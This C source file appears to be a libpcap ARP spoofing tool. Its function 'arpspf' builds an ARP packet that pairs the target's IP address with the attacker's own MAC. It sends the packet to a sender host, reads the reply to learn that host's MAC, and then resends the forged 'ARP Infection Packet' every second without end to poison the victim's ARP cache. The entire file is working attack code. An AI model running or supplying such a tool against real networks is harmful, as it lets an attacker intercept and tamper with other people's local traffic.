#include "arp-spoof.h"


void print_packet(const char *packet, size_t size)
{
    int i = 0;
    for (; size--; ++packet )
    {
        printf("%02X ", *packet);
        i++;
        if(i%16 == 0)
            puts("");

    }
    puts("");
}



void arpspf(unsigned char my_mac[6],struct pcap_pkthdr header, pcap_t **handle, struct sockaddr_in *sender, struct sockaddr_in *target)    {

    char *recvPacket;

    struct fullarp fullarp;

    memcpy(fullarp.eth_hdr.h_dest, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(fullarp.eth_hdr.h_source, my_mac, 6); //  my_mac
    fullarp.eth_hdr.h_proto = htons(ETH_P_ARP);
    fullarp.arp_hdr.htype = htons(ARPHRD_ETHER);
    fullarp.arp_hdr.plen = 4;
    fullarp.arp_hdr.oper = htons(ARPOP_REQUEST);
    fullarp.arp_hdr.ptype = htons(0x0800);
    fullarp.arp_hdr.hlen = 6;

    memcpy(fullarp.arp_hdr.sha, my_mac, 6); // my_mac

    memcpy(fullarp.arp_hdr.spa, &target -> sin_addr, 4); // target
    memcpy(fullarp.arp_hdr.tha, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(fullarp.arp_hdr.tpa, &sender -> sin_addr, 4); // sender

    unsigned char* ptr;
    ptr = (unsigned char*)&fullarp;

    print_packet(ptr, sizeof(fullarp));

    if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
    {
        printf("send packet err : %s\n", pcap_geterr(handle));
        return;
    }

    char senderMac[7];

    int chk = 0;
    while(1) {
    	chk = pcap_next_ex(handle, &header, &recvPacket);
		if(chk != 1 ) continue;
        if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
            if(recvPacket[20] == 0 && recvPacket[21] == 2) {
                memcpy(fullarp.eth_hdr.h_dest, recvPacket + 22, 6);
                break;
            }
        }
	}

    while(1) {
        if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
        {
            printf("send packet err : %s\n", pcap_geterr(handle));
            return;
        }
        puts("ARP Infection Packet Sended.");
        sleep(1);
    }
}

